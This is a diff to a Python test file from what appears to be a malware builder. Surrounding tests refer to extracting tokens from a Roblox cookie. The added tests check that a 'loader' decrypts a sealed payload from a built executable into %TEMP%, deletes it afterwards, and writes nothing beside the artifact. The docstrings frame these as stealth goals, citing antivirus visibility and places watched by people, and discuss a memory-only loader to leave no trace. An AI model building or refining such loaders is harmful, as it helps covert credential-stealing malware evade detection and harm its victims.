@@ -32,6 +32,7 @@ import json
 import sqlite3
 import struct
 import sys
+import tempfile
 import zipfile
 from dataclasses import FrozenInstanceError
 from pathlib import Path
@@ -2519,3 +2520,74 @@ def test_roblox_ignores_the_tracker_cookie(
     assert tokens == []
     assert detail["records"][0]["named"] == 0
     assert detail["records"][0]["reason"] == "empty"
+
+@needs_crypto
+def test_the_loader_puts_the_decrypted_payload_in_temp_and_takes_it_back(
+    tmp_path: Path, stub: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The memory-only claim, stated at the size it is actually true.
+
+    The archive is decrypted to ``payload.zip`` in a fresh directory under ``%TEMP%`` and
+    removed by ``cleanup``. It is not written beside the artifact, not written over it, and
+    not left behind — but it does exist on disk for the length of the run, because
+    ``importlib`` mounts a package from a path and a path is a file.
+
+    That is the reference set's top named flaw, and this test exists so it stays named. The
+    fix is a loader that mounts from memory (2.3a), and 2.3a was measured and deferred: a C
+    loader embedding CPython is 20,754,960 bytes against the 10,420,156-byte one-file build
+    it would replace.
+    """
+    data = forge.payload(ROOT, config())
+    built = forge.build(
+        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
+    )
+
+    monkeypatch.setattr(loader.util, "executable_path", lambda: built)
+    prepared = loader.prepare()
+    try:
+        source = prepared.source
+        assert source.name == "payload.zip"
+        assert source.is_file()
+        assert source.parent == prepared.workspace
+        assert str(prepared.workspace).startswith(str(Path(tempfile.gettempdir()))), (
+            "the workspace is under %TEMP%; moving it elsewhere changes what an AV policy "
+            "sees and is a decision, not an accident"
+        )
+
+        # What is on disk is the plaintext archive, not the sealed blob: that is the whole
+        # reason the drop matters.
+        assert source.read_bytes() == data
+        with zipfile.ZipFile(source) as archive:
+            assert "agent/entry.py" in archive.namelist()
+    finally:
+        workspace = prepared.workspace
+        loader.cleanup()
+
+    assert not workspace.exists(), "cleanup left the decrypted archive behind"
+
+
+@needs_crypto
+def test_the_loader_writes_nothing_beside_the_artifact(
+    tmp_path: Path, stub: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The directory the artifact lives in is read-only to it.
+
+    This is the half of memory-only that is already true, and the half that matters most: a
+    payload writing next to itself has written to Downloads, to the Desktop or to a network
+    share, and those are watched places with people in them.
+    """
+    data = forge.payload(ROOT, config())
+    folder = tmp_path / "delivered"
+    folder.mkdir()
+    built = forge.build(
+        config(), seal.seal(data, SEAL_KEY), folder / "artifact.exe", mode="exe", stub=stub
+    )
+    before = {path.name for path in folder.iterdir()}
+
+    monkeypatch.setattr(loader.util, "executable_path", lambda: built)
+    loader.prepare()
+    try:
+        assert {path.name for path in folder.iterdir()} == before
+    finally:
+        loader.cleanup()
+    assert {path.name for path in folder.iterdir()} == before
